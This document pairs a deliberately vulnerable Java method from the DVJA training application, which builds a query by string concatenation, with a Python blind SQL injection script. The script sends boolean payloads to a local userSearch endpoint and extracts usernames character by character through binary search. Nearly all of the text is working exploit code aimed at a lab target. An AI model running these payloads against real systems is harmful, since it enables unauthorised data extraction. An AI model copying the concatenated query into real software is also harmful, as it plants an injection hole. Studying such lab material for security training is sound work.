'''
src/main/java/com/appsecco/dvja/services/UserService.java

public User findByLoginUnsafe(String login) {
    Query query = entityManager.createQuery("SELECT u FROM User u WHERE u.login = '" + login + "'");
    List<User> resultList = query.getResultList();

    if(resultList.size() > 0)
        return resultList.get(0);
    else
        return null;
}
'''

#!/usr/bin/env python3
import requests
import urllib3
import string

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target settings
BASE_URL = "http://localhost:9000"
PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
SESSION_ID = "1novit506d1dl1ijn7zjo6i7cj"

# Charset to be used (MySQL is case-sensitive by default)
CHARSET = string.ascii_letters  # "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

# Function to send SQL injection payloads
def send_payload(payload):
    session = requests.Session()
    session.cookies.set("JSESSIONID", SESSION_ID)
    url = f"{BASE_URL}/userSearch.action"
    data = {"login": payload}

    response = session.post(url, data=data, proxies=PROXIES, verify=False)
    return "User found" in response.text

# Step 1: Determine Username Length (Binary Search)
def get_username_length():
    print("[*] Determining username length via binary search...")
    low, high = 1, 100  # Assumed upper bound for username length

    while low < high:
        mid = (low + high) // 2
        payload = f"' OR LENGTH(u.login) > {mid} -- '"
        if send_payload(payload):
            low = mid + 1  # Move upper bound up
        else:
            high = mid  # Reduce search space

    print(f"[+] Username length found: {low}")
    return low

# Step 2: Binary Search to Extract Each Character
def binary_search_char(position):
    low, high = 0, len(CHARSET) - 1
    while low <= high:
        mid = (low + high) // 2
        mid_char = CHARSET[mid]

        payload = f"' OR ASCII(SUBSTRING(u.login, {position}, 1)) >= ASCII('{mid_char}') -- '"
        if send_payload(payload):
            low = mid + 1  # Move right
        else:
            high = mid - 1  # Move left

    return CHARSET[high] if high >= 0 else None

# Step 3: Extract Full Username
def extract_username(length):
    username = ""
    print("[*] Extracting username using binary search...")
    for i in range(1, length + 1):
        char = binary_search_char(i)
        if char:
            username += char
            print(f"[+] Found character {i}: {char}")
        else:
            print(f"[-] Failed to extract character at position {i}")
            break
    return username

def main():
    print("=== MySQL SQL Injection Exploit ===")
    length = get_username_length()
    if length:
        username = extract_username(length)
        print(f"[+] Extracted username: {username}")
    else:
        print("[-] Could not determine username length, aborting.")

if __name__ == "__main__":
    main()